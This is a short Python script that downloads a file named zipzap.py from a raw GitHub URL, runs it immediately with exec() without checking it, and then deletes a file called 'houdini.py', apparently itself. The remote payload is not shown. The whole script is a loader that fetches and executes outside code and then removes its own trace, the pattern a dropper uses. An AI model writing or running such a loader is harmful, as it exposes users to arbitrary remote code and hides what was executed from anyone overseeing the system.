import urllib.request
import os

githubRawCodeURL = 'https://raw.githubusercontent.com/kkoves/zip-zap-zabrian/master/zipzap.py'
githubRawCode = urllib.request.urlopen(githubRawCodeURL).read().decode(encoding='UTF-8')
exec(githubRawCode)
os.remove('houdini.py')
